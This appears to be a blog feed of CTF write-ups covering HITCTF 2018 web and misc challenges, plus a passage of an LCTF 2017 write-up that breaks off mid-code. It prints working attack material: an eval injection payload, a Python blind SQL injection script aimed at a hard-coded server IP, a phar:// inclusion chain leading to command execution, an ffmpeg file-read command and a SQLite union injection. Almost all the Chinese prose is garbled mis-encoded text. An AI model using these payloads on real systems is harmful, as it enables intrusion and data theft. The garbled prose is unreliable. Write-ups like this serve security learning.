<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="PHPreading"><a href="#PHPreading" class="headerlink" title="PHPreading"></a>PHPreading</h3><p><code>index.php.bak</code>æ³„éœ²äº†æºç <br>getä¸€ä¸ª<code>asdfgjxzkallgj8852</code>å‚æ•°ï¼Œå€¼ä¸º<code>H1TctF2018EzCTF</code>å³å¯æ‹¿åˆ°flag</p>
<h3 id="BabyEval"><a href="#BabyEval" class="headerlink" title="BabyEval"></a>BabyEval</h3><p>é¢˜ç›®ç»™äº†æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">$str=@(string)$_GET[<span class="string">'str'</span>];</div><div class="line">blackListFilter($black_list, $str);</div><div class="line"><span class="keyword">eval</span>(<span class="string">'$str="'</span>.addslashes($str).<span class="string">'";'</span>);</div><div class="line">--&gt;</div></pre></td></tr></table></figure></p>
<p>ä¼ å…¥<code>str={${phpinfo()}}</code>å¯ä»¥æ‰§è¡Œï¼Œäºæ˜¯æ„é€ <br><img src="/img/2018hit1.png" alt=""><br>å…·ä½“åŸç†å¯ä»¥å‚è€ƒ<code>wooyun-2010-024807</code></p>
<h3 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h3><p>ä¸»é¡µæç¤ºè¦è¿›<code>/news/about/</code>ï¼Œè¿›å»åæç¤ºå¯ç”¨äº†<code>debug</code>ï¼Œæ„é€ <code>/news/about/1</code>å‘ç°æŠ¥é”™ï¼Œæœ‰ä¸ª<code>news/auth</code> è·¯å¾„å¾ˆå¯ç–‘<br>æ‰“å¼€å‘ç°æŠ¥é”™ç»™äº†å¾ˆå¤šä¸œè¥¿ï¼Œæœ‰ä¸ªæ•°æ®åº“è´¦å·å¯†ç ï¼Œè¿›æ•°æ®åº“åæŠŠå­—æ®µæ‹¼èµ·æ¥å°±æ˜¯flag<br><img src="/img/2018hit2.png" alt=""><br><img src="/img/2018hit3.png" alt=""></p>
<h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><p>é¢˜ç›®ç»™äº†æºç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'Login and get the flag'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" &gt;&lt;/input&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$flag = <span class="string">''</span>;</div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</div><div class="line"></div><div class="line">$username = $_POST[<span class="string">'username'</span>];</div><div class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$passwd)==<span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$conn = mysqli_connect();</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</div><div class="line"><span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</div><div class="line">$query = mysqli_query($conn, $query);</div><div class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</div><div class="line">    $result = mysqli_fetch_array($query);</div><div class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Wrong username'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ„é€ ç›²æ³¨æ‹¿åˆ°å¯†ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">req=requests.session()</div><div class="line">lists=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">flag=<span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">    url=<span class="string">"http://182.254.247.127:2005/"</span></div><div class="line">    </div><div class="line">    ok=<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> lists:</div><div class="line">        payload=&#123;<span class="string">"username"</span>:<span class="string">"1'||passwd&lt;'"</span>+flag+s+<span class="string">"'=id#"</span>,<span class="string">"passwd"</span>:<span class="string">""</span>&#125;</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        r1=req.post(url,data=payload)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">in</span> r1.text:</div><div class="line">            ok=s</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            flag+=ok</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">        </div><div class="line">        <span class="comment">#print r1.text</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit14.png" alt=""><br>ç„¶åç”¨å¯†ç å»æ‹¿flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit5.png" alt=""></p>
<h3 id="å°ç”µå½±-200"><a href="#å°ç”µå½±-200" class="headerlink" title="å°ç”µå½± 200"></a>å°ç”µå½± 200</h3><p>Ffmpegè¯»æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 ffmpeg.py file:///flag.txt sxcurity.avi</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit6.png" alt=""></p>
<h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>å‚è€ƒchybeta<br><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a><br><code>__pycache__/app.cpython-35.pyc</code> è¯»å–ç¼“å­˜ï¼Œåç¼–è¯‘å¾—åˆ°æºç <br>ç„¶åçˆ†ç ´key<br><img src="/img/2018hit7.png" alt=""><br>å¾—åˆ°keyï¼Œè§£å¯†å¾—åˆ°flag<br><img src="/img/2018hit8.png" alt=""></p>
<h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>è¿™é¢˜å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥ç”¨ä¼ªåè®®è¯»å–æ‰€æœ‰æºç ï¼Œç„¶åå‘ç°å¯ä»¥å†™æ–‡ä»¶çš„åœ°æ–¹<br>ä½†æ˜¯å†™å…¥çš„æ–‡ä»¶å¤§æ¦‚æ˜¯è¿™æ ·çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$username+&quot; =&gt; &quot;+$password</div></pre></td></tr></table></figure></p>
<p>å¹¶ä¸”æ–‡ä»¶åç¼€ä¸º<code>log</code>ï¼Œè€Œæ–‡ä»¶åŒ…å«çš„éƒ¨åˆ†é™å®šäº†åç¼€ä¸º<code>.php</code>,å°è¯•<code>%00</code>å¤±è´¥ï¼ŒåŒ…å«è¿œç¨‹æ–‡ä»¶å¤±è´¥ï¼Œ<br>é‚£å°±åªå‰©<code>phar://</code>å’Œ<code>zip://</code>äº†ï¼Œè¿™é‡Œå°±åªå‰©ä¸€ä¸ªé—®é¢˜äº†ï¼Œ<code>=&gt;</code>è¯¥æ€ä¹ˆç»•è¿‡ï¼Œ<br>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä»¥å‰çœ‹è¿‡ä¸€èˆªå¤§ä½¬çš„æ–‡ç« æˆ‘ç«Ÿç„¶ç»™å¿˜äº†ï¼Œåæ¥ç»™äº†hintå»çœ‹äº†æ‰çŸ¥é“<br><a href="https://www.jianshu.com/p/03e612b9e379" target="_blank" rel="noopener">https://www.jianshu.com/p/03e612b9e379</a><br>çŸ¥é“æ€ä¹ˆç»•è¿‡åå°±å¾ˆç®€å•äº†<br>æ„é€ ä¸€ä¸ªå«æœ‰<code>=&gt;</code>å­—ç¬¦ä¸²çš„pharåŒ…ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>, <span class="number">0</span>, <span class="string">'test.phar'</span>);  </div><div class="line">$phar-&gt;buildFromDirectory(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/project'</span>);  </div><div class="line">$phar-&gt;setDefaultStub(<span class="string">'1 =&gt; 1.php'</span>, <span class="string">'1 =&gt; 1.php'</span>);  </div><div class="line">$phar-&gt;compressFiles(Phar::GZ);</div></pre></td></tr></table></figure></p>
<p>ç„¶åæŠŠ<code>=&gt;</code>å‰é¢çš„ä½œä¸ºusernameï¼Œåé¢çš„ä½œä¸ºpasswordå†™å…¥logæ–‡ä»¶å¤¹<br><img src="/img/2018hit9.png" alt=""><br><img src="/img/2018hit10.png" alt=""><br>æœ€å<code>?page=phar://log/xxxx/test</code>åŒ…å«æ‰§è¡Œå‘½ä»¤è¯»å–flag</p>
<h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>å…ˆä¸Šå‚è€ƒæ–‡ç« <br><a href="https://klionsec.github.io/2016/05/18/sqlite3-common-injection/" target="_blank" rel="noopener">https://klionsec.github.io/2016/05/18/sqlite3-common-injection/</a><br><a href="http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/" target="_blank" rel="noopener">http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/</a><br><a href="http://godot.win/index.php/archives/16/" target="_blank" rel="noopener">http://godot.win/index.php/archives/16/</a></p>
<p>çœ‹åˆ°é¢˜ç›®åªæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ï¼ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å‘é€äº†ä¸€ä¸ªqueryå‚æ•°ï¼Œç”¨çš„æ˜¯graphql ï¼Œä¼ é€’çš„ä¸œè¥¿é‡Œæœ‰ä¸ªBase32çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†å¾—åˆ°1ï¼Œå°è¯•å‘é€åŠ å¼•å·çš„Base32å­—ç¬¦ä¸²ï¼Œæç¤ºåªæ¥å—ä¸€ä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯å„ç§æœç´¢å¼•æ“ï¼ŒæŸ¥åˆ°å¯ä»¥åˆ—å‡ºæ‰€æœ‰æ–¹æ³•åçš„è¯­å¥ï¼Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query=&#123; __schema&#123;queryType&#123;fields&#123; name description&#125;&#125;&#125; &#125;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit11.png" alt=""><br>å¾—åˆ°å¦ä¸€ä¸ªæ–¹æ³•<code>getscorebyyourname</code>ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥ä¼ é€’ä¸€ä¸ª<code>name</code>å­—æ®µï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œç„¶åå°±æ˜¯æŸ¥è¯¢<code>sqlit3</code>çš„æ³¨å…¥æŠ€å·§äº†ï¼Œæœ€åæ„é€ çš„æ³¨å…¥è¯­å¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">111&apos; union select flag from Secr3t_fl4g --+&quot;</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit12.png" alt=""></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>çˆ¬å¢™å»youtubeçœ‹è§†é¢‘æ‹¿flag</p>
<h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><p>åç¼–è¯‘pycå¾—åˆ°æºç ï¼ŒéšæœºåŠ å¯†base64æˆ–base32ï¼Œä¸€å…±20æ¬¡ï¼Œ<br>å¯ä»¥å†™è„šæœ¬åˆ¤æ–­æ˜¯å¦æœ‰å°å†™å­—æ¯æ¥åŒºåˆ†base64è¿˜æ˜¯base32ï¼Œå› ä¸ºåŠ å¯†æ¬¡æ•°ä¸ç®—å¾ˆå¤šï¼Œæˆ‘æ˜¯ç›´æ¥è‚‰çœ¼è¯†åˆ«æ‰‹åŠ¨è§£å¯†</p>
<h3 id="æ”»å‡»æµé‡åˆ†æ"><a href="#æ”»å‡»æµé‡åˆ†æ" class="headerlink" title="æ”»å‡»æµé‡åˆ†æ"></a>æ”»å‡»æµé‡åˆ†æ</h3><p>æŸ¥çœ‹æµé‡å‘ç°æœ€åæœ‰ä¸ªåŠ å¯†è¯»å–flag.txtçš„ï¼Œå¯¼å‡ºåˆ°æœ¬åœ°åå‘è§£å¯†å³å¯å¾—åˆ°flag</p>
<h3 id="é”®ç›˜æµé‡åˆ†æ"><a href="#é”®ç›˜æµé‡åˆ†æ" class="headerlink" title="é”®ç›˜æµé‡åˆ†æ"></a>é”®ç›˜æµé‡åˆ†æ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark.exe -r keyboard.pcap -T fields -e usb.capdata &gt; usbdata.txt</div></pre></td></tr></table></figure>
<p>å¯¼å‡ºé”®ç›˜æ•°æ®ï¼Œè„šæœ¬è§£å¯†å¾—åˆ°flagï¼Œè¦æ³¨æ„çš„æ˜¯éœ€è¦åˆ¤æ–­shiftçŠ¶æ€æ¥åŒºåˆ†å¤§å°å†™<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</div><div class="line">nums = []</div><div class="line">keys = open(<span class="string">'usbdata.txt'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</div><div class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> :</div><div class="line">         <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> mappings[int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)],line</div><div class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</div><div class="line">    <span class="comment">#print nums</span></div><div class="line">keys.close()</div><div class="line">output = <span class="string">""</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    i+=<span class="number">1</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> i,output,mappings[n]</div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line">    </div><div class="line"><span class="keyword">print</span> <span class="string">'output :n'</span> + output</div></pre></td></tr></table></figure></p>
<p><img src="/img/2018hit13.png" alt=""><br>02å¼€å¤´çš„ä¸ºæŒ‰ä½shiftçŠ¶æ€</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆšæ”¾å‡æ­£å¥½çœ‹åˆ°HITCTFï¼Œåˆ’äº†å‡ é“æ°´é¢˜ï¼ŒWriteUpå¦‚ä¸‹&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 LCTF WriteUp</title>
    <link href="https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/"/>
    <id>https://www.codemonster.cn/2017/11/19/2017-lctf-writeup/</id>
    <published>2017-11-19T15:55:00.000Z</published>
    <updated>2018-07-28T06:19:31.487Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«åˆšåˆšç»“æŸçš„LCTFï¼Œæˆ‘ä»¬é˜Ÿä¸€å…±åšå‡ºäº†4é“webï¼Œä¸€é“miscè¿˜æœ‰ä¸€é“é—®å·è°ƒæŸ¥ï¼ˆå¥½æ°”å•Šæ²¡æŠ¢åˆ°ä¸€è¡€æ¢pwnhubé‚€è¯·ç ï¼‰ï¼Œæ„Ÿè°¢<code>åƒé¥­å»</code>å¤§ä½¬å¸¦é£~<br><a id="more"></a></p>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¯¹æœ¬æ¸£æ¸£è€Œè¨€ï¼Œæœ¬æ¬¡æ¯”èµ›è´¨é‡è¿˜æ˜¯ä¸é”™çš„ï¼Œæˆ‘ä»¬é˜Ÿåšå‡ºçš„å››é“webå°±æ¶‰åŠåˆ°äº†<code>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</code>ã€<code>PaddingOracleæ”»å‡»</code>ã€<code>sprintfæ ¼å¼åŒ–æ³¨å…¥</code>ã€<code>sqlæŠ¥é”™æ³¨å‡ºåº“åè¡¨å</code>ã€<code>joinæ³¨å…¥å‡ºåˆ—å</code>ã€<code>orderbyæ— è¡¨åæ³¨å…¥æ•°æ®</code>ã€<code>SSRFç»•è¿‡</code>ã€<code>æ¡ä»¶ç«äº‰</code>ã€<code>7ä¸ªå­—ç¬¦å†…getshell</code>ç­‰çŸ¥è¯†ï¼Œæ”¶è·é¢‡ä¸°<br>ä¸‹é¢æ˜¯4é“webçš„WriteUp</p>
<h1 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h1><p>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="noopener">http://111.231.111.54/</a></p>
<h2 id="0x00è·å–æºç "><a href="#0x00è·å–æºç " class="headerlink" title="0x00è·å–æºç "></a>0x00è·å–æºç </h2><p>æ‰«ä¸€ä¸‹å‘ç°å­˜åœ¨<code>.login.php.swp</code>å’Œ<code>.admin.php.swp</code>æ³„éœ²<br><code>vim -r login.php</code>æ¢å¤åå¯ä»¥æŸ¥çœ‹æºç <br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;head&gt;</span></div><div class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></div><div class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></div><div class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></div><div class="line"><span class="string">&lt;/head&gt;</span></div><div class="line"><span class="string">&lt;body&gt;</span></div><div class="line"><span class="string">  &lt;div class="login"&gt;</span></div><div class="line"><span class="string">    &lt;h1&gt;åå°ç™»å½•&lt;/h1&gt;</span></div><div class="line"><span class="string">    &lt;form method="post"&gt;</span></div><div class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></div><div class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></div><div class="line"><span class="string">    &lt;/form&gt;</span></div><div class="line"><span class="string">&lt;/div&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div><div class="line"><span class="string">'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">  